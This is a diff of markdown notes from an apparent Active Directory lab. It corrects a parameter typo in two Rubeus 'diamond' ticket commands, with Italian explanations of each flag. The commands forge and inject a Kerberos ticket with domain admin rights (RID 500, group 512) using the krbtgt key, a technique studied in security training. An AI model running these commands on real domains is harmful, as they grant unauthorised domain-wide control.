@@ -29,7 +29,7 @@ The steps are:
 
 To generate a golden ticket with attributes similar to a normal TGT we could use Rubeus:
 ```powershell
-C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt_key> /user:student555 /password:<student_pass> /enctype:<krbtgt_secret_type ex aes> /ticketuser.administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
+C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt_key> /user:student555 /password:<student_pass> /enctype:<krbtgt_secret_type ex aes> /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
 ```
 - `/krbkey:<krbtgt_key>` specifica la chiave crittografica dell'account `krbtgt`, necessaria per le operazioni crittografiche sul ticket.
 - `/user:student555` indica l'account di dominio utilizzato per richiedere il TGT legittimo iniziale.
@@ -45,7 +45,7 @@ C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt_key> /user:student555 /password:<
 
 If we have access as Domain User we can also use `/tgtdeleg` instead of credentials:
 ```powershell
-C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt_key> /tgtdeleg /enctype:<krbtgt_secret_type ex aes> /ticketuser.administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
+C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt_key> /tgtdeleg /enctype:<krbtgt_secret_type ex aes> /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
 ```
 
 
